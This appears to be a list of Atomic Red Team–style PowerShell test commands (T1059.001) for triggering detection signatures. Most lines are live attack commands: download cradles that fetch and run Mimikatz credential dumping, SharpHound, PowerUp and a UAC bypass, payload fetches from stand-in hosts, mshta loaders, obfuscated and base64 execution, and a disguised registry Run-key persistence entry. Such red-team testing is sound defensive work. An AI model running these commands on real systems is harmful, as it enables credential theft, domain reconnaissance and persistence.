# UPDATED ATOMIC TEST COMMANDS - These will trigger the enhanced signatures

# ATOMIC T1059.001 - Test #1: Mimikatz Download and Execute
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

# ATOMIC T1059.001 - Test #2: BloodHound from Local Disk
import-module "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"; try { Invoke-BloodHound -OutputDirectory $env:Temp } catch { $_; exit $_.Exception.HResult}

# ATOMIC T1059.001 - Test #3: BloodHound from Memory
write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan; IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-BloodHound -OutputDirectory $env:Temp

# ATOMIC T1059.001 - Test #4: Mimikatz via PsSendKeys
$wshell=New-Object -ComObject WScript.Shell; $wshell.SendKeys('^o'); $wshell.AppActivate($title); invoke-mimikatz -dumpcr

# ATOMIC T1059.001 - Test #5: Invoke-AppPathBypass
Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"

# ATOMIC T1059.001 - Test #6: MsXml COM Object
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://example.com/payload.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"

# ATOMIC T1059.001 - Test #7: PowerShell XML Requests
powershell.exe -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://example.com/payload.xml');$Xml.command.a.execute | IEX"

# ATOMIC T1059.001 - Test #8: PowerShell Invoke MSHTA
cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://example.com/payload.sct').Exec();close()"

# ATOMIC T1059.001 - Test #9: Invoke-DownloadCradle
Invoke-DownloadCradle.ps1

# ATOMIC T1059.001 - Test #10: Fileless Script Execution
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" /f; iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))

# ATOMIC T1059.001 - Test #11: NTFS Alternate Data Stream
Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'; $streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'; Invoke-Expression $streamcommand

# ATOMIC T1059.001 - Test #12: PowerShell Session Creation
New-PSSession -ComputerName $env:COMPUTERNAME; Test-Connection $env:COMPUTERNAME

# ATOMIC T1059.001 - Test #13-16: Command Parameter Variations
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop

# ATOMIC T1059.001 - Test #17: Obfuscated PowerShell Execution
powershell.exe -e JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==

# ATOMIC T1059.001 - Test #18: Malicious Cmdlets Simulation
function Invoke-Mimikatz { Write-Host Pretending to invoke Invoke-Mimikatz }; Invoke-Mimikatz

# ATOMIC T1059.001 - Test #19: PowerUp Invoke-AllChecks
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks

# ATOMIC T1059.001 - Test #20: DNS Nslookup Abuse
function nslookup { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")}; powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]

# ATOMIC T1059.001 - Test #21: SOAPHound BloodHound Data Dump
SOAPHound.exe --user $env:USERNAME --password P@ssword1 --domain $env:USERDOMAIN --dc 10.0.1.14 --bhdump --cachefilename c:\temp\cache.txt --outputdirectory c:\temp\test2

# ATOMIC T1059.001 - Test #22: SOAPHound Cache Building
SOAPHound.exe --user $($env:USERNAME)@$($env:USERDOMAIN) --password P@ssword1 --dc 10.0.1.14 --buildcache --cachefilename c:\temp\cache.txt

# Additional Test Commands for New Signatures

# Download Cradle Pattern Test
IEX (New-Object Net.WebClient).DownloadString('https://example.com/payload.ps1')

# Registry Persistence Test
reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /t REG_SZ /d "powershell.exe -windowstyle hidden -c 'malicious code'" /f

# Execution Policy Bypass Test
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -c "Get-Process"

# Complex Obfuscation Test
$([char]73+[char]69+[char]88) ((New-Object Net.WebClient).DownloadString('https://example.com'))

# Fileless Execution Test
Invoke-Expression ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("R2V0LVByb2Nlc3M=")))

# Credential Harvesting Test
Get-Credential | Export-Clixml -Path credential.xml
